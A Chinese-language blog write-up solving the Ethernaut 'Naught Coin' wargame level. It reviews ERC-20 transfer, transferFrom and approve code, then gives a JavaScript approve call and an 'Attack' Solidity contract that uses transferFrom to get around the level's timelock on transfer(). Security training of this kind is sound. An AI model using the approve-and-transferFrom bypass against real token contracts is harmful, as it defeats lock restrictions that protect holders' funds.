---
title: Ethernaut - Naught Coin
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-23
---

Naught Coin 是一个 ERC20 货币！

这一节考点就是 ERC20 的概念了。

<!--more-->

# ERC-20 代币接收问题

当 ERC-20 代币被发送到并非为处理 ERC-20 代币而设计的智能合约时，这些代币可能会永久丢失。 出现这种情况的原因是，接收合约无法识别或回应所传入的代币，而且 ERC-20 标准中也没有通知接受合约所传入代币的机制。 导致这一问题的主要原因包括：

1. 代币转移机制

- ERC-20 代币使用 transfer 或 transferFrom 函数进行转移
    - 当用户使用这些函数将代币发送到合约地址时，无论接收合约是否是为处理它们而设计，代币都会被转移

1. 缺乏通知
    - 接收合约不会收到已向其发送代币的通知或回调
    - 如果接收合约缺乏处理代币的机制（例如，回退函数或专门用于处理代币接收的函数），则代币实际上会卡在合约的地址中
2. 无内置处理
    - ERC-20 标准不包含用于接收待实现合约的强制函数，导致许多合约无法正确管理传入的代币





除了 ERC-20 ，这个题还有个转账限制，合约创建10年后才可以转账2333

那我现在等十年回来再做（不是）



```solidity
function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
```

这里还是看一下父类的实现。

```solidity
function transfer(address to, uint256 value) public virtual returns (bool) {
    address owner = _msgSender();
    _transfer(owner, to, value);
    return true;
}

function _transfer(address from, address to, uint256 value) internal {
    if (from == address(0)) {
        revert ERC20InvalidSender(address(0));
    }
    if (to == address(0)) {
        revert ERC20InvalidReceiver(address(0));
    }
    _update(from, to, value);
}

function _update(address from, address to, uint256 value) internal virtual {
    if (from == address(0)) {
        // Overflow check required: The rest of the code assumes that totalSupply never overflows
        _totalSupply += value;
    } else {
        uint256 fromBalance = _balances[from];
        if (fromBalance < value) {
            revert ERC20InsufficientBalance(from, fromBalance, value);
        }
        unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
            _balances[from] = fromBalance - value;
        }
    }

    if (to == address(0)) {
        unchecked {
            // Overflow not possible:
            // value <= totalSupply or value <= fromBalance <= totalSupply.
            _totalSupply -= value;
        }
    } else {
        unchecked {
            // Overflow not possible: 
            // balance + value is at most totalSupply, which we know fits into a uint256.
            _balances[to] += value;
        }
    }

    emit Transfer(from, to, value);
}
```

没看出啥漏洞啊？





看来player是绕不过检测的，但是其他合约是不走这个检测的。

我可以让其他合约给 address(0) 发送 `1000000 * (10 ** uint256(decimals()))` 个货币，整个合约就没钱了？不对，因为直接用 transfer 不能给 address(0) 发。



是不是有其他的我可以调用的函数，绕过这个 transfer ？

```solidity
function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, value);
    _transfer(from, to, value);
    return true;
}

function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
    uint256 currentAllowance = allowance(owner, spender);
    if (currentAllowance < type(uint256).max) {
        if (currentAllowance < value) {
            revert ERC20InsufficientAllowance(spender, currentAllowance, value);
        }
        unchecked {
            _approve(owner, spender, currentAllowance - value, false);
        }
    }
}

function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
    if (owner == address(0)) {
        revert ERC20InvalidApprover(address(0));
    }
    if (spender == address(0)) {
        revert ERC20InvalidSpender(address(0));
    }
    _allowances[owner][spender] = value;
    if (emitEvent) {
        emit Approval(owner, spender, value);
    }
}
```

 发现个新概念，**授权和转移**

**授权和转移**：transferFrom 是 ERC-20 的授权机制的一部分。当用户调用 approve 函数授权某个地址（比如一个智能合约）在一定额度内代为转移代币时，其他地址（通常是智能合约或第三方）可以通过调用 transferFrom 来转移这些代币。



所以我可以给一个智能合约授权我的所有货币，然后让智能合约调用 tranferFrom 帮我把钱花掉。

```js
await contract.approve("0x6Aeb10F5b34A3553f57eAd90D3e2B5D7f0F52bEd", 1000000000000000000000000n)
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public target;
    constructor(address _target) {
        target = _target;
    }

    function transferAll() external payable {
        (bool success, bytes memory returnData) = address(target).call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(msg.sender), address(this), 1000000 * (10 ** uint256(18)))
        );
        require(success, "Call failed");
    }
}
```





